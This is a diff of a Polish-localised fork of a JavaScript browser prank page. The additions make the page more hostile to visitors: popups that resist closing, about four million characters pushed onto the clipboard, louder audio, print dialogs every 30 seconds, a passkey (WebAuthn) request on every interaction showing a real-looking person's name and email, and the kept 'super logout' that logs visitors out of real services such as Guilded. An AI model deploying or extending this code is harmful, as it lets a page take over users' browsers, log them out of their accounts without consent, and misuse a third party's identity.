@@ -152,9 +152,14 @@ Guilded: ['POST', 'https://www.guilded.gg/api/logout']
 const wins = []
 
 /**
- * Count of number of clicks
+ * Count of number of clicks  - added by @9fm
  */
+
 let interactionCount = 0
+
+//Bardzo dlugi string xd, ciulowa implementacja ale to chyba lepsze niz ~ 4 miliony znakow w pliku poprostu - added by @9fm
+
+const veryLongString = repeatStringNumTimes(repeatStringNumTimes('zostałeś zptoszkowany!!1 ',100),1500) // - added by @9fm
 
 /**
  * Number of iframes injected into the page for the "super logout" functionality.
@@ -179,6 +184,7 @@ const isParentWindow = !isChildWindow
 /*
  * Run this code in all windows, *both* child and parent windows.
  */
+
 init()
 
 /*
@@ -228,7 +234,11 @@ function init () {
     } else {
       requestPointerLock()
 
-      requestFullscreen()
+      if (!window.ApplePaySession) {
+        // Don't request TouchID on every interaction in Safari since it blocks
+        // the event loop and stops windows from moving
+        requestWebauthnAttestation()
+      }
       requestClipboardRead()
       requestMidiAccess()
       requestBluetoothAccess()
@@ -236,11 +246,7 @@ function init () {
       requestSerialAccess()
       requestHidAccess()
       requestCameraAndMic()
-      if (Math.random() < 0.1) {
-        // Don't request TouchID on every interaction in Safari since it blocks
-        // the event loop and stops windows from moving
-        requestWebauthnAttestation()
-      }
+      requestFullscreen()
     }
   })
 }
@@ -252,7 +258,6 @@ function initChildWindow () {
   registerProtocolHandlers()
   hideCursor()
   moveWindowBounce()
-  setupFollowWindow()
   startVideo()
   detectWindowClose()
   triggerFileDownload()
@@ -288,7 +293,7 @@ function initParentWindow () {
       removeHelloMessage()
       rainbowThemeColor()
       animateUrlWithEmojis()
-      speak('That was a mistake')
+      speak('To był błąd')
     }
   })
 }
@@ -365,7 +370,7 @@ function registerProtocolHandlers () {
   const handlerUrl = window.location.href + '/url=%s'
 
   protocolWhitelist.forEach(proto => {
-    navigator.registerProtocolHandler(proto, handlerUrl, 'The Annoying Site')
+    navigator.registerProtocolHandler(proto, handlerUrl, 'Ptoszek')
   })
 }
 
@@ -600,6 +605,24 @@ function openWindow () {
   wins.push(win)
 
   if (wins.length === 2) setupSearchWindow(win)
+
+  // Added by @wetraks
+  win.onunload = function () {
+    // Some browsers might not support onunload, but include it for completeness
+    return false;
+  };
+
+  // For modern browsers
+  win.addEventListener("beforeunload", function (e) {
+    e.preventDefault();
+    e.returnValue = "";
+  });
+
+  // For older browsers
+  win.onbeforeunload = function () {
+    return "";
+  };
+  // Added by @wetraks
 }
 
 /**
@@ -658,7 +681,7 @@ function startTheramin () {
 
   const oscillator = ({ pitch, volume }) => {
     oscillatorNode.frequency.value = pitchBase + pitch * pitchRange
-    gainNode.gain.value = volume * 0.5
+    gainNode.gain.value = volume * 3
   }
 
   document.body.addEventListener('mousemove', event => {
@@ -708,8 +731,8 @@ function requestWebauthnAttestation () {
         // User:
         user: {
           id: new Uint8Array(16),
-          name: 'YOU_ARE_HACKED@THEANNOYINGSITE.COM',
-          displayName: 'YOU ARE HACKED'
+          name: 'security@alpermail.top',
+          displayName: 'Bartłomiej Kwieciński'
         },
 
         pubKeyCredParams: [{
@@ -828,20 +851,11 @@ function moveWindowBounce () {
 
     if (x < MARGIN) vx = Math.abs(vx)
     if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
-    if (y < TOP_MARGIN) vy = Math.abs(vy)
+    if (y < MARGIN + 20) vy = Math.abs(vy)
     if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)
 
     window.moveBy(vx, vy)
   }, TICK_LENGTH)
-}
-
-/**
- * Follow the user's mouse
- */
-function setupFollowWindow () {
-  document.addEventListener('mousemove', function (e) {
-    window.moveTo(e.screenX - (WIN_WIDTH / 2), e.screenY - (WIN_HEIGHT / 2))
-  })
 }
 
 /**
@@ -908,13 +922,20 @@ function rainbowThemeColor () {
     meta.setAttribute('content', '#' + zeroFill(6, Math.floor(Math.random() * 16777215).toString(16)))
   }, 50)
 }
-
+function repeatStringNumTimes(string, times) {
+  var repeatedString = "";
+  while (times > 0) {
+    repeatedString += string;
+    times--;
+  }
+  return repeatedString;
+}
 /**
- * Copy cat pictures onto the user's clipboard. Requires user-initiated event.
+ * Kopiuje ~4 miliony znaków do schowka  - added by @9fm
  */
+
 function copySpamToClipboard () {
-  const randomArt = getRandomArrayEntry(ART) + '\nCheck out https://theannoyingsite.com'
-  clipboardCopy(randomArt)
+  clipboardCopy(veryLongString)
 }
 
 /**
@@ -975,7 +996,7 @@ function startAlertInterval () {
     } else {
       window.print()
     }
-  }, 120_000)
+  }, 30000)
 }
 
 /**
@@ -1066,7 +1087,7 @@ function superLogout () {
     }
 
     const div = document.createElement('div')
-    div.innerText = `Logging you out from ${name}...`
+    div.innerText = `Wylogowywanie się z ${name}...`
 
     const logoutMessages = document.querySelector('.logout-messages')
     logoutMessages.appendChild(div)
@@ -1101,8 +1122,8 @@ function fillHistory () {
 function getRandomCoords () {
   const x = MARGIN +
     Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
-  const y = TOP_MARGIN +
-    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - TOP_MARGIN))
+  const y = MARGIN +
+    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
   return { x, y }
 }
 
@@ -1116,12 +1137,15 @@ function getRandomArrayEntry (arr) {
 // TODO: document this
 function setupSearchWindow (win) {
   if (!win) return
-  const { x, y } = getRandomCoords()
-  win.moveTo(x, y)
-  win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2)
-  win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0])
+  win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[0])
   let searchIndex = 1
   const interval = setInterval(() => {
+    if (searchIndex >= SEARCHES.length) {
+      clearInterval(interval)
+      win.window.location = window.location.pathname
+      return
+    }
+
     if (win.closed) {
       clearInterval(interval)
       onCloseWindow(win)
@@ -1130,43 +1154,12 @@ function setupSearchWindow (win) {
 
     win.window.location = window.location.pathname
     setTimeout(() => {
-      win.resizeTo(WIN_WIDTH, WIN_HEIGHT)
-    }, 500)
-    setTimeout(() => {
       const { x, y } = getRandomCoords()
       win.moveTo(x, y)
-      win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2)
-      win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
-
+      win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
       searchIndex += 1
-      if (searchIndex >= SEARCHES.length) {
-        searchIndex = 0
-      }
-    }, 1000)
-  }, 3000)
-}
-
-function detectBrowser () {
-  const userAgent = navigator.userAgent
-  if (/samsungbrowser\//i.test(userAgent)) {
-    return 'samsung'
-  } else if (/edg\//i.test(userAgent)) {
-    return 'edge'
-  } else if (/edga\//i.test(userAgent)) {
-    return 'edge'
-  } else if (/opt\//i.test(userAgent)) {
-    // Opera iOS
-    return 'opera'
-  } else if (/opr\//i.test(userAgent)) {
-    // Opera Android
-    return 'opera'
-  } else if (/chrome\//i.test(userAgent)) {
-    return 'chrome'
-  } else if (/safari\//i.test(userAgent)) {
-    return 'safari'
-  } else if (/firefox\//i.test(userAgent)) {
-    return 'firefox'
-  }
+    }, 500)
+  }, 2500)
 }
 
 /* my own mods*/
